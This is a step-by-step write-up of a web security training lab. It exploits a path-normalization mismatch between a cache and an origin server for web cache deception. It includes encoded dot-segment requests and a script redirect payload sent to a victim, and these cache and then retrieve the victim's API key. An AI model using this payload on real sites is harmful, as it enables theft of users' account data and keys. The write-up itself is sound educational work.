# Lab 3 — Exploiting origin server normalization for web cache deception

> [← Back to Web Cache Deception](../README.md)

---

## 🎯 Objective
The origin server normalizes encoded dot-segments in URLs. Exploit this to cache Carlos's account page under a `/resources/` path and steal his API key.

---

## 🪜 Steps

### Step 1 — Login to wiener account
Credentials: `wiener:peter`

> 📸 Screenshot: `./screenshots/step1-login.png`

---

### Step 2 — Intercept and send to Repeater
Intercept `GET /my-account` → send to **Repeater**.

> 📸 Screenshot: `./screenshots/step2-repeater.png`

---

### Step 3 — Test path handling
Try these URLs:
```
GET /my-account/abc   → 404 Not Found
GET /my-accountabc    → 404 Not Found
```

> 📸 Screenshot: `./screenshots/step3-404.png`

---

### Step 4 — Find working delimiter via Intruder
Send to **Intruder** → Sniper attack with delimiters after `/my-account`.
Uncheck URL-encode.

Result: Only `?` returns **200 OK**.

> 📸 Screenshot: `./screenshots/step4-delimiter.png`

---

### Step 5 — Test URL normalization on origin
Try the encoded dot-segment path:
```
GET /aaa/..%2fmy-account
```
Origin server resolves this to `/my-account` → returns **200 OK** with your account data and API key.

This confirms the **origin server** normalizes `..%2f`.

> 📸 Screenshot: `./screenshots/step5-normalization.png`

---

### Step 6 — Identify cache rules
Test paths under `/resources/`:
```
GET /resources/anything
```
- 1st request → `X-Cache: miss`
- 2nd request → `X-Cache: hit` ✅

Cache stores responses for any path starting with `/resources/`.

> 📸 Screenshot: `./screenshots/step6-cache-miss.png`
> 📸 Screenshot: `./screenshots/step6-cache-hit.png`

---

### Step 7 — Combine: exploit cache + normalization mismatch
Try:
```
GET /resources/..%2fmy-account
```
- Cache sees `/resources/...` → stores it (matches cache rule)
- Origin normalizes `..%2f` → serves `/my-account` content

- 1st request → `X-Cache: miss`
- 2nd request → `X-Cache: hit` ✅

> 📸 Screenshot: `./screenshots/step7-miss.png`
> 📸 Screenshot: `./screenshots/step7-hit.png`

---

### Step 8 — Deliver exploit to victim
On exploit server, paste:

```html
<script>
  document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd"
</script>
```

Store → Deliver to victim.

> 📸 Screenshot: `./screenshots/step8-exploit.png`

---

### Step 9 — Get Carlos's API key
In Repeater, request:
```
GET /resources/..%2fmy-account?wcd
```
The cached response contains **Carlos's API key**. Submit it to solve the lab.

> 📸 Screenshot: `./screenshots/step9-api.png`
> 📸 Screenshot: `./screenshots/step9-solved.png`

---

## ✅ Result
Lab solved!

---

## 💡 Key Takeaway
When the origin server normalizes encoded path segments but the cache does not, attackers craft URLs the cache treats as static but the origin resolves to sensitive endpoints.
